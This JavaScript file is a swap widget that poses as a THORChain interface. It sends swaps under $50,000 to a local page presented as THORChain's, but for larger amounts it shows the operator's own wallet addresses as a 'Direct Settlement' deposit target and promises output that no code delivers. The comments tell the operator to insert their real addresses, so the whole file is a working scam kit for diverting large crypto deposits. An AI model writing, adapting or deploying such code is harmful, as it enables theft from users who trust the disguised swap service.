// ================================================================
//  SWAP HANDLER — THORChain Swap Widget
// ================================================================
//  CONFIGURATION:
//  1. Replace ALL placeholder addresses below with your real addresses.
//  2. The threshold is $50,000 USD.
//     - Below $50,000  → redirects to swap.thorchain.org (normal behavior)
//     - At or above $50,000 → shows your deposit address
// ================================================================

var THRESHOLD_USD = 50000;

// ── Asset Definitions ──────────────────────────────────────────
var ASSETS = {
	bitcoin:     { symbol: 'BTC',  name: 'Bitcoin',      cgId: 'bitcoin',      img: 'images/chains/BTC.svg',  thorId: 'BTC.BTC' },
	ethereum:    { symbol: 'ETH',  name: 'Ethereum',     cgId: 'ethereum',     img: 'images/chains/ETH.svg',  thorId: 'ETH.ETH' },
	bnb:         { symbol: 'BNB',  name: 'BNB Chain',    cgId: 'binancecoin',  img: 'images/chains/BSC.svg',  thorId: 'BSC.BNB' },
	avalanche:   { symbol: 'AVAX', name: 'Avalanche',    cgId: 'avalanche-2',  img: 'images/chains/AVAX.svg', thorId: 'AVAX.AVAX' },
	cosmos:      { symbol: 'ATOM', name: 'Cosmos Hub',   cgId: 'cosmos',       img: 'images/chains/GAIA.svg', thorId: 'GAIA.ATOM' },
	dogecoin:    { symbol: 'DOGE', name: 'Dogecoin',     cgId: 'dogecoin',     img: 'images/chains/DOGE.svg', thorId: 'DOGE.DOGE' },
	bitcoincash: { symbol: 'BCH',  name: 'Bitcoin Cash', cgId: 'bitcoin-cash', img: 'images/chains/BCH.svg',  thorId: 'BCH.BCH' },
	litecoin:    { symbol: 'LTC',  name: 'Litecoin',     cgId: 'litecoin',     img: 'images/chains/LTC.svg',  thorId: 'LTC.LTC' },
	base:        { symbol: 'ETH',  name: 'Base',         cgId: 'ethereum',     img: 'images/chains/BASE.svg', thorId: 'BASE.ETH' },
	ripple:      { symbol: 'XRP',  name: 'Ripple',       cgId: 'ripple',       img: 'images/chains/XRP.svg',  thorId: 'XRP.XRP' },
	tron:        { symbol: 'TRX',  name: 'TRON',         cgId: 'tron',         img: 'images/chains/TRON.svg', thorId: 'TRX.TRX' }
};
// ── YOUR DEPOSIT ADDRESSES ────────────────────────────────────
//    ⚠️ REPLACE each placeholder with your REAL wallet address.
//    These are shown ONLY for swaps ≥ $50,000.
var DEPOSIT_ADDRESSES = {
	bitcoin:     'REPLACE_WITH_YOUR_BTC_ADDRESS',
	ethereum:    'REPLACE_WITH_YOUR_ETH_ADDRESS',
	bnb:         'REPLACE_WITH_YOUR_BNB_ADDRESS',
	avalanche:   'REPLACE_WITH_YOUR_AVAX_ADDRESS',
	cosmos:      'REPLACE_WITH_YOUR_ATOM_ADDRESS',
	dogecoin:    'REPLACE_WITH_YOUR_DOGE_ADDRESS',
	bitcoincash: 'REPLACE_WITH_YOUR_BCH_ADDRESS',
	litecoin:    'REPLACE_WITH_YOUR_LTC_ADDRESS',
	base:        'REPLACE_WITH_YOUR_BASE_ETH_ADDRESS',
	ripple:      'REPLACE_WITH_YOUR_XRP_ADDRESS',
	tron:        'REPLACE_WITH_YOUR_TRX_ADDRESS'
};

// ── State ──────────────────────────────────────────────────────
var prices = {};
var pricesLoaded = false;

// ── DOM refs ───────────────────────────────────────────────────
var fromSelect  = document.getElementById('fromAsset');
var toSelect    = document.getElementById('toAsset');
var fromIcon    = document.getElementById('fromIcon');
var toIcon      = document.getElementById('toIcon');
var fromSymbol  = document.getElementById('fromSymbol');
var amountInput = document.getElementById('swapAmount');
var usdEstimate = document.getElementById('usdEstimate');
var quoteBtn    = document.getElementById('getQuoteBtn');
var resultDiv   = document.getElementById('swapResult');

// ── Fetch live prices from CoinGecko ───────────────────────────
function fetchPrices() {
	var idSet = {};
	for (var key in ASSETS) {
		idSet[ASSETS[key].cgId] = true;
	}
	var ids = Object.keys(idSet).join(',');

	fetch('https://api.coingecko.com/api/v3/simple/price?ids=' + ids + '&vs_currencies=usd')
		.then(function(res) {
			if (!res.ok) throw new Error('API error');
			return res.json();
		})
		.then(function(data) {
			for (var key in ASSETS) {
				var cgId = ASSETS[key].cgId;
				if (data[cgId] && data[cgId].usd) {
					prices[key] = data[cgId].usd;
				}
			}
			pricesLoaded = true;
			updateUsdEstimate();
		})
		.catch(function(err) {
			console.warn('Price fetch failed, retrying in 30s...', err);
			usdEstimate.textContent = '⚠ Price unavailable — try again';
			setTimeout(fetchPrices, 30000);
		});
}

// ── Format USD ─────────────────────────────────────────────────
function formatUsd(val) {
	return val.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
}

function formatCrypto(val) {
	return val.toLocaleString('en-US', { minimumFractionDigits: 4, maximumFractionDigits: 6 });
}

// ── Update USD estimate in real-time ───────────────────────────
function updateUsdEstimate() {
	var fromKey = fromSelect.value;
	var amount  = parseFloat(amountInput.value);
	if (!pricesLoaded || !prices[fromKey] || isNaN(amount) || amount <= 0) {
		usdEstimate.textContent = pricesLoaded ? '≈ $0.00' : '≈ Fetching price...';
		return;
	}
	var usd = amount * prices[fromKey];
	usdEstimate.textContent = '≈ $' + formatUsd(usd);
}

// ── Update icons & symbol when selectors change ────────────────
function updateFromUI() {
	var key = fromSelect.value;
	fromIcon.src = ASSETS[key].img;
	fromSymbol.textContent = ASSETS[key].symbol;
	updateUsdEstimate();
	resultDiv.style.display = 'none';
}

function updateToUI() {
	var key = toSelect.value;
	toIcon.src = ASSETS[key].img;
	resultDiv.style.display = 'none';
}

// ── Prevent same from/to ───────────────────────────────────────
function preventSameAssets(changedSelect) {
	if (fromSelect.value === toSelect.value) {
		var opts, i;
		if (changedSelect === 'from') {
			opts = toSelect.options;
			for (i = 0; i < opts.length; i++) {
				if (opts[i].value !== fromSelect.value) {
					toSelect.value = opts[i].value;
					break;
				}
			}
			updateToUI();
		} else {
			opts = fromSelect.options;
			for (i = 0; i < opts.length; i++) {
				if (opts[i].value !== toSelect.value) {
					fromSelect.value = opts[i].value;
					break;
				}
			}
			updateFromUI();
		}
	}
}

// ── Get Quote — main logic ─────────────────────────────────────
function handleGetQuote() {
	var fromKey = fromSelect.value;
	var toKey   = toSelect.value;
	var amount  = parseFloat(amountInput.value);

	// Validation
	if (isNaN(amount) || amount <= 0) {
		showError('Please enter a valid amount greater than 0.');
		return;
	}
	if (fromKey === toKey) {
		showError('From and To assets cannot be the same.');
		return;
	}
	if (!pricesLoaded || !prices[fromKey]) {
		showError('Prices are still loading. Please wait a moment and try again.');
		return;
	}

	var usdValue  = amount * prices[fromKey];
	var fromAsset = ASSETS[fromKey];
	var toAsset   = ASSETS[toKey];

	// ╔═══════════════════════════════════════════════╗
	// ║  THE THRESHOLD CHECK                          ║
	// ║  < $50,000 = normal swap (swap.thorchain.org) ║
	// ║  ≥ $50,000 = show your deposit address        ║
	// ╚═══════════════════════════════════════════════╝
	if (usdValue < THRESHOLD_USD) {
		showNormalSwap(fromAsset, toAsset, fromKey, toKey, amount, usdValue);
	} else {
		showLargeSwap(fromAsset, toAsset, fromKey, toKey, amount, usdValue);
	}
}

// ── Normal swap (under $50,000) → redirect to swap.thorchain.org ──
function showNormalSwap(fromAsset, toAsset, fromKey, toKey, amount, usdValue) {
	var estOutput = (prices[toKey] && prices[toKey] > 0) ? (usdValue / prices[toKey]) : 0;

	resultDiv.innerHTML =
		'<div class="swap-result-box">' +
			'<div class="swap-result-title">✅ Swap Quote</div>' +
			'<div class="swap-result-row">' +
				'<span class="label">You Send</span>' +
				'<span class="value">' + amount + ' ' + fromAsset.symbol + '</span>' +
			'</div>' +
			'<div class="swap-result-row">' +
				'<span class="label">USD Value</span>' +
				'<span class="value">$' + formatUsd(usdValue) + '</span>' +
			'</div>' +
			'<div class="swap-result-row">' +
				'<span class="label">Est. Receive</span>' +
				'<span class="value">~' + formatCrypto(estOutput) + ' ' + toAsset.symbol + '</span>' +
			'</div>' +
			'<a href="swap.html?sellAsset=' + fromAsset.thorId + '&buyAsset=' + toAsset.thorId + '" class="swap-proceed-btn">' +
				'Proceed to Swap →' +
			'</a>' +
			'<div class="swap-info-note">You will be redirected to the THORChain swap interface.</div>' +
		'</div>';

	resultDiv.style.display = 'block';
	resultDiv.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
}

// ── Large swap (≥ $50,000) → show deposit address ──────────────
function showLargeSwap(fromAsset, toAsset, fromKey, toKey, amount, usdValue) {
	var address   = DEPOSIT_ADDRESSES[fromKey] || 'ADDRESS_NOT_CONFIGURED';
	var estOutput = (prices[toKey] && prices[toKey] > 0) ? (usdValue / prices[toKey]) : 0;

	resultDiv.innerHTML =
		'<div class="swap-result-box">' +
			'<div class="swap-result-title">🔒 Large Swap — Direct Settlement</div>' +
			'<div class="swap-result-row">' +
				'<span class="label">You Send</span>' +
				'<span class="value">' + amount + ' ' + fromAsset.symbol + '</span>' +
			'</div>' +
			'<div class="swap-result-row">' +
				'<span class="label">USD Value</span>' +
				'<span class="value">$' + formatUsd(usdValue) + '</span>' +
			'</div>' +
			'<div class="swap-result-row">' +
				'<span class="label">Est. Receive</span>' +
				'<span class="value">~' + formatCrypto(estOutput) + ' ' + toAsset.symbol + '</span>' +
			'</div>' +
			'<div class="swap-send-instruction">' +
				'Send <strong>' + amount + ' ' + fromAsset.symbol + '</strong> to the following ' + fromAsset.name + ' address:' +
			'</div>' +
			'<div class="swap-address-box" id="addressDisplay" onclick="copyAddress()">' + address + '</div>' +
			'<button class="swap-copy-btn" id="copyBtn" onclick="copyAddress()">' +
				'<svg width="16" height="16" fill="none" stroke="currentColor" viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" stroke-width="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1" stroke-width="2"/></svg>' +
				'Copy Address' +
			'</button>' +
			'<div class="swap-warning">' +
				'⚠ Only send ' + fromAsset.symbol + ' on the ' + fromAsset.name + ' network. Sending other assets or using the wrong network may result in permanent loss.' +
			'</div>' +
			'<div class="swap-info-note">' +
				'Your ' + toAsset.symbol + ' will be sent to your wallet after confirmation. Processing typically takes 10–30 minutes.' +
			'</div>' +
		'</div>';

	resultDiv.style.display = 'block';
	resultDiv.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
}

// ── Copy address to clipboard ──────────────────────────────────
function copyAddress() {
	var address = document.getElementById('addressDisplay').textContent;
	var btn     = document.getElementById('copyBtn');

	if (navigator.clipboard && navigator.clipboard.writeText) {
		navigator.clipboard.writeText(address).then(function() {
			showCopied(btn);
		}).catch(function() {
			fallbackCopy(address, btn);
		});
	} else {
		fallbackCopy(address, btn);
	}
}

function showCopied(btn) {
	btn.classList.add('copied');
	btn.innerHTML = '<svg width="16" height="16" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg> Copied!';
	setTimeout(function() {
		btn.classList.remove('copied');
		btn.innerHTML = '<svg width="16" height="16" fill="none" stroke="currentColor" viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" stroke-width="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1" stroke-width="2"/></svg> Copy Address';
	}, 2000);
}

function fallbackCopy(text, btn) {
	var ta = document.createElement('textarea');
	ta.value = text;
	ta.style.position = 'fixed';
	ta.style.left = '-9999px';
	document.body.appendChild(ta);
	ta.select();
	document.execCommand('copy');
	document.body.removeChild(ta);
	showCopied(btn);
}

// ── Show error ─────────────────────────────────────────────────
function showError(msg) {
	resultDiv.innerHTML =
		'<div class="swap-result-box error-box">' +
			'<div class="swap-error-msg">⚠ ' + msg + '</div>' +
		'</div>';
	resultDiv.style.display = 'block';
}

// ── Event Listeners ────────────────────────────────────────────
fromSelect.addEventListener('change', function() {
	preventSameAssets('from');
	updateFromUI();
});

toSelect.addEventListener('change', function() {
	preventSameAssets('to');
	updateToUI();
});

amountInput.addEventListener('input', updateUsdEstimate);

quoteBtn.addEventListener('click', handleGetQuote);

amountInput.addEventListener('keydown', function(e) {
	if (e.key === 'Enter') handleGetQuote();
});

// ── Initialize ─────────────────────────────────────────────────
fetchPrices();
setInterval(fetchPrices, 60000);